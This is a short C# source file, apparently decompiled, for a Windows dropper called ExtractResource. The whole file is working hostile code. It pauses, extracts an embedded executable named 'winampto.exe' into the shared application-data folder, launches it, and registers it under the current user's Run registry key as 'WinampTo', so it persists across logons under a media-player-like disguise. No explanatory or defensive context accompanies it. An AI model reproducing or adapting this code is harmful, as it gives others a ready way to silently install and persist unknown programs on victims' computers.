using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;

namespace ExtractResource;

internal class Program
{
	public static string programDirectory = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

	private static void Main(string[] args)
	{
		Thread.Sleep(3000);
		Cikart("ExtractResource", programDirectory, "NewFolder1", "winampto.exe");
		Process.Start(programDirectory + "\\winampto.exe");
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue("WinampTo", programDirectory + "\\winampto.exe");
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("WinampTo", programDirectory + "\\winampto.exe");
	}

	private static void Cikart(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}
}
